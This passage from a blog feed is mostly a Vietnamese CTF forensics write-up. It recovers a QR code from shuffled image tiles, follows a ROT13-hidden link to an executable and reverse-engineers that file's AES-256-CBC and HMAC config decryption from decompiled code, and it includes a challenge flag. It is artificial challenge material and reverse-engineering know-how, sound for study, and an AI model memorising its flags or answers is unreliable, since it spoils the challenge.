&amp;gt;&amp;gt;&amp;gt; print(a[:32])
5769179ccdf950443501d9978f52ddb5
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;By using the discovered &lt;code&gt;APP_SECRET&lt;/code&gt; and understanding the payload structure, the encrypted data can be reconstructed and decrypted.
&lt;img src=&quot;https://hackmd.io/_uploads/SJcqbLPCxe.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;/code&gt;&lt;/pre&gt;
</content:encoded></item><item><title>Candle - bounty PTIT HN-HCM CTF Finals 2025 forensic</title><link>https://bruning-frighting.github.io/KAiZ3nThong/posts/candle/</link><guid isPermaLink="true">https://bruning-frighting.github.io/KAiZ3nThong/posts/candle/</guid><pubDate>Tue, 21 Oct 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;Candle - bounty PTIT HN-HCM CTF Finals 2025 forensic&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/ryKvW80jxx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Nhận một file rawdata PEPPER và file mp4&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Ở file mp4 Thấy file mp3 khá lớn khi check strings có các header lạ
&lt;img src=&quot;https://hackmd.io/_uploads/H1lKdwRjxl.png&quot; alt=&quot;image&quot; /&gt;&lt;/li&gt;
&lt;li&gt;Dùng binwalk để dump file mp4 ra vì
&lt;img src=&quot;https://hackmd.io/_uploads/SJU6dwAoxg.png&quot; alt=&quot;image&quot; /&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/HJgAdwRsxl.png&quot; alt=&quot;image&quot; /&gt;
có điểm đáng chú ý là file manifest.json (nó làm một file cấu hình cho việc lấy flag)&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;└─$ strings a/out_tiles/manifest.json
  &quot;rows&quot;: 5,
  &quot;cols&quot;: 6,
  &quot;tile_w&quot;: 82,
  &quot;tile_h&quot;: 98,
  &quot;orig_w&quot;: 490,
  &quot;orig_h&quot;: 490,
  &quot;padded_w&quot;: 492,
  &quot;padded_h&quot;: 490,
  &quot;pad_right&quot;: 2,
  &quot;pad_bottom&quot;: 0,
  &quot;pieces&quot;: [
    {
      &quot;file&quot;: &quot;piece_00.png&quot;,
      &quot;r&quot;: 0,
      &quot;c&quot;: 0
    },
    {
      &quot;file&quot;: &quot;piece_01.png&quot;,
      &quot;r&quot;: 0,
      &quot;c&quot;: 1
    },
    {
      &quot;file&quot;: &quot;piece_02.png&quot;,
      &quot;r&quot;: 0,
      &quot;c&quot;: 2
    },
    {
      &quot;file&quot;: &quot;piece_03.png&quot;,
      &quot;r&quot;: 0,
      &quot;c&quot;: 3
    },
    {
      &quot;file&quot;: &quot;piece_04.png&quot;,
      &quot;r&quot;: 0,
      &quot;c&quot;: 4
    },
    {
      &quot;file&quot;: &quot;piece_05.png&quot;,
      &quot;r&quot;: 0,
      &quot;c&quot;: 5
    },
    {
      &quot;file&quot;: &quot;piece_06.png&quot;,
      &quot;r&quot;: 1,
      &quot;c&quot;: 0
    },
    {
      &quot;file&quot;: &quot;piece_07.png&quot;,
      &quot;r&quot;: 1,
      &quot;c&quot;: 1
    },
    {
      &quot;file&quot;: &quot;piece_08.png&quot;,
      &quot;r&quot;: 1,
      &quot;c&quot;: 2
    },
    {
      &quot;file&quot;: &quot;piece_09.png&quot;,
      &quot;r&quot;: 1,
      &quot;c&quot;: 3
    },
    {
      &quot;file&quot;: &quot;piece_10.png&quot;,
      &quot;r&quot;: 1,
      &quot;c&quot;: 4
    },
    {
      &quot;file&quot;: &quot;piece_11.png&quot;,
      &quot;r&quot;: 1,
      &quot;c&quot;: 5
    },
    {
      &quot;file&quot;: &quot;piece_12.png&quot;,
      &quot;r&quot;: 2,
      &quot;c&quot;: 0
    },
    {
      &quot;file&quot;: &quot;piece_13.png&quot;,
      &quot;r&quot;: 2,
      &quot;c&quot;: 1
    },
    {
      &quot;file&quot;: &quot;piece_14.png&quot;,
      &quot;r&quot;: 2,
      &quot;c&quot;: 2
    },
    {
      &quot;file&quot;: &quot;piece_15.png&quot;,
      &quot;r&quot;: 2,
      &quot;c&quot;: 3
    },
    {
      &quot;file&quot;: &quot;piece_16.png&quot;,
      &quot;r&quot;: 2,
      &quot;c&quot;: 4
    },
    {
      &quot;file&quot;: &quot;piece_17.png&quot;,
      &quot;r&quot;: 2,
      &quot;c&quot;: 5
    },
    {
      &quot;file&quot;: &quot;piece_18.png&quot;,
      &quot;r&quot;: 3,
      &quot;c&quot;: 0
    },
    {
      &quot;file&quot;: &quot;piece_19.png&quot;,
      &quot;r&quot;: 3,
      &quot;c&quot;: 1
    },
    {
      &quot;file&quot;: &quot;piece_20.png&quot;,
      &quot;r&quot;: 3,
      &quot;c&quot;: 2
    },
    {
      &quot;file&quot;: &quot;piece_21.png&quot;,
      &quot;r&quot;: 3,
      &quot;c&quot;: 3
    },
    {
      &quot;file&quot;: &quot;piece_22.png&quot;,
      &quot;r&quot;: 3,
      &quot;c&quot;: 4
    },
    {
      &quot;file&quot;: &quot;piece_23.png&quot;,
      &quot;r&quot;: 3,
      &quot;c&quot;: 5
    },
    {
      &quot;file&quot;: &quot;piece_24.png&quot;,
      &quot;r&quot;: 4,
      &quot;c&quot;: 0
    },
    {
      &quot;file&quot;: &quot;piece_25.png&quot;,
      &quot;r&quot;: 4,
      &quot;c&quot;: 1
    },
    {
      &quot;file&quot;: &quot;piece_26.png&quot;,
      &quot;r&quot;: 4,
      &quot;c&quot;: 2
    },
    {
      &quot;file&quot;: &quot;piece_27.png&quot;,
      &quot;r&quot;: 4,
      &quot;c&quot;: 3
    },
    {
      &quot;file&quot;: &quot;piece_28.png&quot;,
      &quot;r&quot;: 4,
      &quot;c&quot;: 4
    },
    {
      &quot;file&quot;: &quot;piece_29.png&quot;,
      &quot;r&quot;: 4,
      &quot;c&quot;: 5
    }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&quot;rows&quot;: 5, &quot;cols&quot;: 6
→ Ảnh gốc được chia thành 5 hàng × 6 cột = 30 mảnh.&lt;/p&gt;
&lt;p&gt;&quot;tile_w&quot;: 82, &quot;tile_h&quot;: 98
→ Mỗi mảnh (tile) có kích thước 82 × 98 px.&lt;/p&gt;
&lt;p&gt;&quot;orig_w&quot;: 490, &quot;orig_h&quot;: 490
→ Kích thước ảnh gốc (chưa cắt, chưa pad): 490 × 490 px.&lt;/p&gt;
&lt;p&gt;&quot;padded_w&quot;: 492, &quot;padded_h&quot;: 490
→ Để chia đều, ảnh gốc được padding thành 492 × 490 px
(tức là thêm 2 px bên phải, &quot;pad_right&quot;: 2, &quot;pad_bottom&quot;: 0).&lt;/p&gt;
&lt;p&gt;&quot;pieces&quot;
→ Danh sách các mảnh.
Mỗi entry gồm:&lt;/p&gt;
&lt;p&gt;&quot;file&quot;: tên file PNG chứa mảnh.&lt;/p&gt;
&lt;p&gt;&quot;r&quot;: chỉ số hàng (row index).&lt;/p&gt;
&lt;p&gt;&quot;c&quot;: chỉ số cột (column index).&lt;/p&gt;
&lt;h2&gt;Cách ghép lại ảnh gốc&lt;/h2&gt;
&lt;p&gt;Tạo một canvas trống kích thước padded_w × padded_h = 492 × 490 px.
Với từng entry trong &quot;pieces&quot;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Đọc ảnh piece_xx.png (82×98).&lt;/li&gt;
&lt;li&gt;Dán vào vị trí (c * tile_w, r * tile_h).
Ví dụ: piece_19.png có {r:3, c:1} → dán vào tọa độ (1×82, 3×98) = (82, 294).
Sau khi ghép đủ 30 mảnh, crop bỏ phần padding (2 px bên phải) → còn lại 490 × 490 px đúng kích thước gốc.
Nhưng sau khi tôi làm vậy viết script vẫn không recovery lại được ảnh gốc tôi nghi ngờ các file name đã bị scamble tôi đã thử kiểm tra file với exiftool thì thấy mỗi file đều có một trường Pos dường như tương ứng với các tọa độ
&lt;img src=&quot;https://hackmd.io/_uploads/Skp7qDRseg.png&quot; alt=&quot;image&quot; /&gt;
Dùng exiftol -pos để truy xuất các POS tương tứng với mỗi file
&lt;img src=&quot;https://hackmd.io/_uploads/HJvXivRoex.png&quot; alt=&quot;image&quot; /&gt;
Lấy được tọa độ ma trận rồi giờ ta tiến hành ghép lại ảnh
&lt;img src=&quot;https://hackmd.io/_uploads/SJkhivAjlx.png&quot; alt=&quot;code&quot; /&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;┌──(thong㉿DESKTOP-SD4MBKE)-[/mnt/c/users/tttho/downloads/a/out_tiles]
└─$ python e.py
Done.
- padded.png:        492x490
- reconstructed.png: 490x490
- grid:              5 rows x 6 cols; tile=82x98
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/HJEZaw0sex.png&quot; alt=&quot;reconstructed&quot; /&gt;
đây là image sau khi recovery là một mã QR quét thì ra được một link
truy cập vào có một bài post
&lt;img src=&quot;https://hackmd.io/_uploads/BJNPaDCiel.png&quot; alt=&quot;image&quot; /&gt;
decryption base64 chuỗi ra flag fake&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;─$ echo &quot;VGhpcyBpcyBmbGFnOiBQVElUQ1RGe1ZpZXROYW1NdW9uTmFtfQ==&quot; | base64 -d
This is flag: PTITCTF{VietNamMuonNam}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;còn một chuỗi ký tự rất lạ tôi đoán làm một url đã bị scamble
&lt;img src=&quot;https://hackmd.io/_uploads/H16gADRoxl.png&quot; alt=&quot;image&quot; /&gt;
check nhanh với trang dcode oke no đã bị ROT13
&lt;img src=&quot;https://hackmd.io/_uploads/Skr7RD0jee.png&quot; alt=&quot;image&quot; /&gt;
một link github download một file exe
Download file về và nhận diện signature file với die
&lt;img src=&quot;https://hackmd.io/_uploads/HJAi0v0sex.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;h2&gt;Phân tích file candlegame.exe&lt;/h2&gt;
&lt;p&gt;Hàm start sẽ gọi sub_140001180() -&amp;gt; sub_140189EE0 (main code)
Logic hàm Sub_140001180 như một hàm init dùng để check ngoại lệ và xử lý nếu không sẽ gọi tới maincode (sub_140189EE0)
&lt;img src=&quot;https://hackmd.io/_uploads/SJQxSLRoxl.png&quot; alt=&quot;image&quot; /&gt;
Tại ô khoanh đó đang xây dựng một mảng argv[] để truyền vào main code
=&amp;gt; v14 là *argv
=&amp;gt; qword_14020E020 là argc&lt;/p&gt;
&lt;h2&gt;maincode ( application GUI )&lt;/h2&gt;
&lt;p&gt;Tại hàm maincode dựng một application GUI do hàm main này khá phức tạp nên tôi sẽ không đi theo hướng phân tích hàm này tôi sẽ tìm kiếm các API nghi ngờ
&lt;img src=&quot;https://hackmd.io/_uploads/SJl7IUCoxg.png&quot; alt=&quot;image&quot; /&gt;
thấy chương trình sử dụng bcrypt.dll và các API liên quan đến việc decryption/ derived key
xref tới API BcryptDecrypt -&amp;gt; trỏ về hàm gọi nó
&lt;img src=&quot;https://hackmd.io/_uploads/HJnv8LAixe.png&quot; alt=&quot;image&quot; /&gt;
Hàm được gọi từ sub_1400E6960+253&lt;/p&gt;
&lt;h2&gt;sub_1400E6960 (decryption AES)&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;_BOOL8 __fastcall sub_1400E6960(PUCHAR pbSecret, const __m128i *a2, UCHAR *a3, __int64 a4, _QWORD *a5)
{
  ULONG v8; // ebx
  BOOL v9; // ebx
  __int64 v11; // r12
  UCHAR *v12; // rax
  UCHAR *v13; // rbp
  ULONG v14; // r9d
  __m128i v15; // xmm1
  UCHAR *v16; // r9
  size_t cbOutput; // r13
  NTSTATUS v18; // eax
  __int64 v19; // rsi
  UCHAR *v20; // r14
  UCHAR *v21; // r13
  size_t v22; // rdi
  UCHAR *v23; // r13
  unsigned __int64 v24; // rdx
  UCHAR *v25; // r13
  unsigned __int64 v26; // r15
  UCHAR *v27; // rcx
  size_t v28; // rax
  _BYTE *v29; // r9
  size_t v30; // r8
  size_t v31; // r14
  UCHAR *v32; // r9
  UCHAR *v33; // [rsp+50h] [rbp-98h]
  PUCHAR v34; // [rsp+50h] [rbp-98h]
  PUCHAR v35; // [rsp+50h] [rbp-98h]
  PUCHAR v36; // [rsp+50h] [rbp-98h]
  size_t Size; // [rsp+58h] [rbp-90h]
  size_t v38; // [rsp+60h] [rbp-88h]
  unsigned __int64 v39; // [rsp+68h] [rbp-80h]
  _BYTE *v40; // [rsp+68h] [rbp-80h]
  _BYTE *v41; // [rsp+68h] [rbp-80h]
  UCHAR pbOutput[4]; // [rsp+74h] [rbp-74h] BYREF
  ULONG pcbResult; // [rsp+78h] [rbp-70h] BYREF
  ULONG v44; // [rsp+7Ch] [rbp-6Ch] BYREF
  BCRYPT_ALG_HANDLE phAlgorithm; // [rsp+80h] [rbp-68h] BYREF
  BCRYPT_KEY_HANDLE phKey; // [rsp+88h] [rbp-60h] BYREF
  UCHAR pbIV[16]; // [rsp+90h] [rbp-58h] BYREF

  v8 = a4;
  if ( !a4 )
    return 0;
  phAlgorithm = 0LL;
  if ( BCryptOpenAlgorithmProvider(&amp;amp;phAlgorithm, L&quot;AES&quot;, 0LL, 0) &amp;lt; 0 )
    return 0;
  if ( BCryptSetProperty(phAlgorithm, L&quot;ChainingMode&quot;, (PUCHAR)L&quot;ChainingModeCBC&quot;, 0x20u, 0) &amp;lt; 0
    || (*(_DWORD *)pbOutput = 0, pcbResult = 0, BCryptGetProperty(phAlgorithm, &quot;O&quot;, pbOutput, 4u, &amp;amp;pcbResult, 0) &amp;lt; 0) )
  {
    BCryptCloseAlgorithmProvider(phAlgorithm, 0);
    return 0;
  }
  v11 = *(unsigned int *)pbOutput;
  if ( *(_DWORD *)pbOutput )
  {
    v12 = (UCHAR *)sub_140189220(*(unsigned int *)pbOutput);
    v13 = v12;
    *v12 = 0;
    if ( v11 != 1 )
      memset(v12 + 1, 0, v11 - 1);
    v14 = *(_DWORD *)pbOutput;
  }
  else
  {
    v14 = 0;
    v13 = 0LL;
  }
  phKey = 0LL;
  if ( BCryptGenerateSymmetricKey(phAlgorithm, &amp;amp;phKey, v13, v14, pbSecret, 0x20u, 0) &amp;gt;= 0 )
  {
    v15 = _mm_loadu_si128(a2);
    v44 = 0;
    *(__m128i *)pbIV = v15;
    if ( BCryptDecrypt(phKey, a3, v8, 0LL, pbIV, 0x10u, 0LL, 0, &amp;amp;v44, 1u) &amp;gt;= 0 )
    {
      v16 = (UCHAR *)a5[1];
      Size = v44;
      cbOutput = (size_t)&amp;amp;v16[-*a5];
      v33 = (UCHAR *)*a5;
      if ( cbOutput &amp;gt;= v44 )
      {
        if ( v44 &amp;lt; cbOutput &amp;amp;&amp;amp; v16 != &amp;amp;v33[v44] )
        {
          LODWORD(cbOutput) = v44;
          a5[1] = &amp;amp;v33[v44];
        }
        goto LABEL_17;
      }
      v24 = v44 - cbOutput;
      v39 = v24;
      if ( a5[2] - (_QWORD)v16 &amp;gt;= v24 )
      {
        *v16 = 0;
        v25 = v16 + 1;
        v34 = v16;
        if ( v24 != 1 )
        {
          memset(v16 + 1, 0, v24 - 1);
          v25 = &amp;amp;v34[v39];
        }
        a5[1] = v25;
        v33 = (UCHAR *)*a5;
        cbOutput = (size_t)&amp;amp;v25[-*a5];
LABEL_17:
        *(__m128i *)pbIV = _mm_loadu_si128(a2);
        v18 = BCryptDecrypt(phKey, a3, v8, 0LL, pbIV, 0x10u, v33, cbOutput, &amp;amp;v44, 1u);
        v9 = v18 &amp;gt;= 0;
        if ( v18 &amp;lt; 0 )
        {
LABEL_22:
          BCryptDestroyKey(phKey);
          BCryptCloseAlgorithmProvider(phAlgorithm, 0);
          goto LABEL_23;
        }
        v19 = v44;
        v20 = (UCHAR *)a5[1];
        v21 = (UCHAR *)*a5;
        v22 = (size_t)&amp;amp;v20[-*a5];
        if ( v22 &amp;gt;= v44 )
        {
          if ( v44 &amp;lt; v22 )
          {
            v23 = &amp;amp;v21[v44];
            if ( v20 != v23 )
              a5[1] = v23;
          }
          goto LABEL_22;
        }
        v26 = v44 - v22;
        if ( a5[2] - (_QWORD)v20 &amp;gt;= v26 )
        {
          *v20 = 0;
          v27 = v20 + 1;
          if ( v26 != 1 )
          {
            memset(v27, 0, v26 - 1);
            v27 = &amp;amp;v20[v26];
          }
          a5[1] = v27;
          goto LABEL_22;
        }
        if ( 0x7FFFFFFFFFFFFFFFLL - v22 &amp;lt; v26 )
          sub_14018D5F0(&quot;vector::_M_default_append&quot;);
        v31 = 2 * v22;
        if ( v22 &amp;lt; v26 )
          v31 = v44;
        v32 = (UCHAR *)sub_140189220(v31);
        v32[v22] = 0;
        if ( v26 != 1 )
        {
          v35 = v32;
          memset(&amp;amp;v32[v22 + 1], 0, v26 - 1);
          v32 = v35;
        }
        if ( v22 )
        {
          v32 = (UCHAR *)memmove(v32, v21, v22);
        }
        else if ( !v21 )
        {
LABEL_52:
          a5[2] = &amp;amp;v32[v31];
          *(__m128i *)a5 = _mm_unpacklo_epi64((__m128i)(unsigned __int64)v32, (__m128i)(unsigned __int64)&amp;amp;v32[v19]);
          goto LABEL_22;
        }
        v36 = v32;
        j_j_free_2_4(v21);
        v32 = v36;
        goto LABEL_52;
      }
      if ( 0x7FFFFFFFFFFFFFFFLL - cbOutput &amp;lt; v24 )
        sub_14018D5F0(&quot;vector::_M_default_append&quot;);
      v28 = 2 * cbOutput;
      if ( cbOutput &amp;lt; v24 )
        v28 = v44;
      v38 = v28;
      v29 = (_BYTE *)sub_140189220(v28);
      v29[cbOutput] = 0;
      v30 = v39 - 1;
      if ( v39 != 1 )
      {
        v40 = v29;
        memset(&amp;amp;v29[cbOutput + 1], 0, v30);
        v29 = v40;
      }
      if ( cbOutput )
      {
        v29 = memmove(v29, v33, cbOutput);
      }
      else if ( !v33 )
      {
LABEL_44:
        LODWORD(cbOutput) = Size;
        v33 = v29;
        *(__m128i *)a5 = _mm_unpacklo_epi64((__m128i)(unsigned __int64)v29, (__m128i)(unsigned __int64)&amp;amp;v29[Size]);
        a5[2] = &amp;amp;v29[v38];
        goto LABEL_17;
      }
      v41 = v29;
      j_j_free_2_4(v33);
      v29 = v41;
      goto LABEL_44;
    }
    BCryptDestroyKey(phKey);
  }
  BCryptCloseAlgorithmProvider(phAlgorithm, 0);
  v9 = 0;
LABEL_23:
  if ( v13 )
    j_j_free_2_4(v13);
  return v9;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Hàm này nhận vào:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;pbSecret: khóa bí mật (32 bytes = AES-256 key).&lt;/li&gt;
&lt;li&gt;a2: con trỏ đến IV (16 bytes, kiểu __m128i).&lt;/li&gt;
&lt;li&gt;a3: dữ liệu mã hóa cần giải mã.&lt;/li&gt;
&lt;li&gt;a4: kích thước dữ liệu mã hóa.&lt;/li&gt;
&lt;li&gt;a5: một struct giống như std::vector&amp;lt;UCHAR&amp;gt; (3 phần tử: begin, end, capacity_end).
Nhiệm vụ: giải mã chuỗi bằng AES-256-CBC với khóa pbSecret và IV a2, rồi ghi dữ liệu plaintext vào buffer mà a5 trỏ tới.
Toi sẽ rename hàm lại Dec_AES cho tiện việc phân tích
hàm này được gọi từ sub_1400037B0&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;sub_1400037B0 (config cấu hình)&lt;/h2&gt;
&lt;p&gt;Nhìn vào hàm sub_1400037B0, đây là một hàm khởi tạo / giải mã dữ liệu cấu hình được mã hóa và nhúng sẵn trong chương trình.
Mình tóm tắt logic của nó như sau:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/Hy4sPICjgg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1. Chuỗi base64&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Đây là một chuỗi Base64 rất dài.&lt;/li&gt;
&lt;li&gt;Vòng lặp đầu tiên (while ( v7 &amp;gt; ... )) là code tự viết để giải mã base64 → byte array.&lt;/li&gt;
&lt;li&gt;Kết quả lưu vào buffer v3 (kiểu std::vector&amp;lt;unsigned char&amp;gt;).&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;while ( v7 &amp;gt; 0x5Au )
  {
    v9 = v7 - 71;
    if ( (unsigned __int8)(v7 - 97) &amp;gt; 0x19u )
      goto LABEL_8;
LABEL_6:
    v6 = v9 | (v6 &amp;lt;&amp;lt; 6);
    v10 = v5 + 6;
    if ( v5 + 6 &amp;gt;= 0 )
    {
LABEL_16:
      v14 = v6 &amp;gt;&amp;gt; v10;
      if ( v1 != v2 )
      {
        *v2++ = v14;
LABEL_18:
        v5 -= 2;
        goto LABEL_8;
      }
      Size = v1 - (UCHAR *)v3;
      v15 = 0x7FFFFFFFFFFFFFFFLL;
      if ( v1 - (UCHAR *)v3 == 0x7FFFFFFFFFFFFFFFLL )
        sub_14018D5F0(&quot;vector::_M_realloc_insert&quot;);
      if ( Size )
      {
        v16 = 0x7FFFFFFFFFFFFFFFLL;
        v17 = 2 * (v1 - (UCHAR *)v3);
        if ( v17 &amp;lt;= 0x7FFFFFFFFFFFFFFFLL )
          v16 = 2 * (v1 - (UCHAR *)v3);
        if ( v17 &amp;gt;= v1 - (UCHAR *)v3 )
          v15 = v16;
        v62 = v15;
        v18 = (_BYTE *)sub_140189220(v15);
        v19 = v18;
        v18[Size] = v14;
        if ( Size &amp;gt; 0 )
        {
          Sizea = (size_t)&amp;amp;v18[Size + 1];
          v20 = memmove(v18, v3, v1 - (UCHAR *)v3);
          v2 = (UCHAR *)Sizea;
          v19 = v20;
          goto LABEL_32;
        }
      }
      else
      {
        v19 = (_BYTE *)sub_140189220(1uLL);
        *v19 = v14;
        v62 = 1LL;
      }
      v2 = &amp;amp;v19[Size + 1];
      if ( v3 )
      {
LABEL_32:
        pbSecret = v2;
        Sizeb = (size_t)v19;
        j_j_free_2_4(v3);
        v19 = (_BYTE *)Sizeb;
        v2 = pbSecret;
        v3 = (_DWORD *)Sizeb;
      }
      else
      {
        v3 = v19;
      }
      v1 = &amp;amp;v19[v62];
      goto LABEL_18;
    }
LABEL_7:
    v5 = v10;
LABEL_8:
    v7 = *++v4;
    if ( !v7 )
      goto LABEL_9;
  }
  if ( v7 &amp;lt;= 0x2Au )
    goto LABEL_8;
  switch ( v7 )
  {
    case &apos;+&apos;:
      v9 = 62;
      goto LABEL_6;
    case &apos;/&apos;:
      v9 = 63;
      goto LABEL_6;
    case &apos;0&apos;:
    case &apos;1&apos;:
    case &apos;2&apos;:
    case &apos;3&apos;:
    case &apos;4&apos;:
    case &apos;5&apos;:
    case &apos;6&apos;:
    case &apos;7&apos;:
    case &apos;8&apos;:
    case &apos;9&apos;:
      v6 = (v7 + 4) | (v6 &amp;lt;&amp;lt; 6);
      v10 = v5 + 6;
      if ( v5 + 6 &amp;gt;= 0 )
        goto LABEL_16;
      goto LABEL_7;
    case &apos;=&apos;:
      break;
    case &apos;A&apos;:
    case &apos;B&apos;:
    case &apos;C&apos;:
    case &apos;D&apos;:
    case &apos;E&apos;:
    case &apos;F&apos;:
    case &apos;G&apos;:
    case &apos;H&apos;:
    case &apos;I&apos;:
    case &apos;J&apos;:
    case &apos;K&apos;:
    case &apos;L&apos;:
    case &apos;M&apos;:
    case &apos;N&apos;:
    case &apos;O&apos;:
    case &apos;P&apos;:
    case &apos;Q&apos;:
    case &apos;R&apos;:
    case &apos;S&apos;:
    case &apos;T&apos;:
    case &apos;U&apos;:
    case &apos;V&apos;:
    case &apos;W&apos;:
    case &apos;X&apos;:
    case &apos;Y&apos;:
    case &apos;Z&apos;:
      v9 = v7 - 65;
      goto LABEL_6;
    default:
      goto LABEL_8;
  }
LABEL_9:
  v11 = v2 - (UCHAR *)v3;
  LOBYTE(v81[0]) = 0;
  v80 = 0LL;
  Block = v81;
  if ( v11 &amp;lt;= 0x53 )
  {
    *(_QWORD *)(a1 + 8) = 0LL;
    *(_QWORD *)a1 = a1 + 16;
    *(_BYTE *)(a1 + 16) = 0;
    if ( v3 )
      goto LABEL_13;
    return a1;
  }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Lưu kết quả vào v3 sau khi giải mã base64&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. Kiểm tra header&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;if (*v3 != 877020995) ...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Giá trị 877020995 = 0x34544643 (ASCII: &quot;CFT4&quot;).
Tức là dữ liệu sau khi base64 decode phải bắt đầu bằng một magic header &quot;CFT4&quot; (hay &quot;CandleFT4&quot;?).
Nếu sai → return rỗng.
&lt;img src=&quot;https://hackmd.io/_uploads/ryCTqURiel.png&quot; alt=&quot;image&quot; /&gt;
check header và bỏ quá 0x44 bytes lấy phần cipher check các block 16bytes xem đủ không
&lt;img src=&quot;https://hackmd.io/_uploads/SyxSsICogx.png&quot; alt=&quot;image&quot; /&gt;
chỉ định các Provider bước init trước khi tạo &lt;em&gt;&lt;strong&gt;hash và decryption&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. Tính &amp;amp; kiểm tra HMAC&lt;/strong&gt;
Sau đó, nó dùng SHA256 để derived key (pbSecret 32bytes) với salt/nonce trong cipher
&lt;img src=&quot;https://hackmd.io/_uploads/Bk8DlwAieg.png&quot; alt=&quot;image&quot; /&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/BkkZZwCsxg.png&quot; alt=&quot;image&quot; /&gt;
pbInput giống với file PEPPER =&amp;gt; file này là file cấu hình cho chương trình lấy key nhưng do file đã được chạy rồi hoặc được dump từ memory nên hardcode hoặc file đã được nhúng hardcode từ trước
Derived Key
Chương trình đọc file PEPPER (32 bytes secret). Từ secret này và Salt trong cipher, nó sinh ra key bằng cách băm:
v82 = SHA256(PEPPER || salt)
K1 = SHA256(v82 || 0x01)
K2 = SHA256(v82 || 0x02)
Trong đó:
K1 = key dùng cho AES-CBC decrypt.
K2 = key dùng cho HMAC-SHA256 verify.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4.Tính HMAC để xác thực&lt;/strong&gt;
Nó không decrypt ngay, mà hash kiểm tra trước:
&lt;img src=&quot;https://hackmd.io/_uploads/H1PyGDCixe.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Tại đây ta quay lai một chút ở phần ciphertext
Format header cipher&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[0x00..0x03]  Magic   (&quot;CGF4&quot;)    = 877020995
[0x04..0x13]  Salt/Nonce (16 bytes)
[0x14..0x23]  IV (16 bytes, dùng cho AES-CBC)
[0x24..0x43]  Tag (32 bytes – HMAC lưu kèm để xác thực)
[0x44..end]   Ciphertext (payload đã mã hoá)

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Tính HMAC-SHA256 với key = K2 trên dữ liệu:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&quot;CandleGame-AES-CBC-v1&quot; || IV || Ciphertext
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;So sánh kết quả với Tag (32 bytes) embed sẵn trong file ở offset 0x24..0x43.
Nếu mismatch → reject, return chuỗi rỗng.
Nếu match → tiếp tục decrypt.&lt;/p&gt;
&lt;p&gt;Decrypt AES
Khi HMAC hợp lệ, nó gọi Dec_AES với:
Key = K1 (32 bytes)
IV = block 16 bytes trong file
Ciphertext = phần sau offset 0x44
Giải mã theo chuẩn AES-256-CBC. Plaintext kết quả được trả về trong vùng nhớ Block.&lt;/p&gt;
&lt;p&gt;Viết script giải mã
&lt;img src=&quot;https://hackmd.io/_uploads/HynVDDRjle.png&quot; alt=&quot;code&quot; /&gt;&lt;/p&gt;
&lt;h2&gt;Quay trở lại hàm maincode ban đầu đưa ra kết luận&lt;/h2&gt;
&lt;p&gt;Đọc tham số bet&lt;/p&gt;
&lt;p&gt;Lấy string input từ a1 (argv-like) → convert sang số (strtoll).&lt;/p&gt;
&lt;p&gt;Kiểm tra lỗi (errno, overflow, &amp;lt;=0).&lt;/p&gt;
&lt;p&gt;Nếu bet ≤ 0 → in [ERR] Bet must be &amp;gt; 0.&lt;/p&gt;
&lt;p&gt;Nếu bet &amp;gt; bankroll hiện tại → in [ERR] Bet exceeds bankroll.&lt;/p&gt;
&lt;p&gt;Trừ tiền trong bankroll&lt;/p&gt;
&lt;p&gt;Nếu đủ tiền → bankroll -= bet.&lt;/p&gt;
&lt;p&gt;Xác định kết quả random / tính toán&lt;/p&gt;
&lt;p&gt;Gọi RNG (sub_1400063D0, sub_1400064C0, sub_1400DC0E0).&lt;/p&gt;
&lt;p&gt;Tạo ra mấy giá trị ngẫu nhiên: odds, bias, multiplier…&lt;/p&gt;
&lt;p&gt;So sánh với tham số a2 (SHORT/LONG) để quyết định thắng/thua.&lt;/p&gt;
&lt;p&gt;Khi thắng/thua&lt;/p&gt;
&lt;p&gt;Nếu win: cộng tiền (2×bet hoặc nhiều hơn). In ra message:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[WIN-SHORT] O=... | bank=...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;hoặc&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[WIN-LONG] ...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Nếu lose: không hoàn lại, in&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[LOSE-SHORT] O=...
&lt;/code&gt;&lt;/pre&gt;
